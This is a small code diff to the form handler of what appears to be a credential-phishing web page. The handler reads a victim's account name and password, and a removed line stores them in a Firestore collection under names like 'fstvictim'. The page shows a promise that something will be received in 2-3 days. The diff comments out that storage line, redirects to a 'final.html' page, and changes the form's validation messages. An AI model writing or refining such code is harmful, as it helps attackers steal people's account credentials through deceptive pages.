@@ -14,14 +14,15 @@ function sendthis(){
 	var vid = document.getElementById("vid").value;
 
 	data = {accname:name,accpass:pass}
-	if (name !== null && vid !== null && pass !== null )
+	if (name !== "" && vid !== "" && pass !== "" )
 	{
-		db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data);
-		document.getElementById("t").innerHTML = "You will recieve this in 2-3 days";
+		//db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data);
+		window.location.href = "final.html";
 	}
 	else
 	{
-		document.getElementById("t").innerHTML = "Complete the form";
+		document.getElementById("t").innerHTML = "Please Complete The Form";
+		alert("Please Complete The Form");
 	}
 
 }
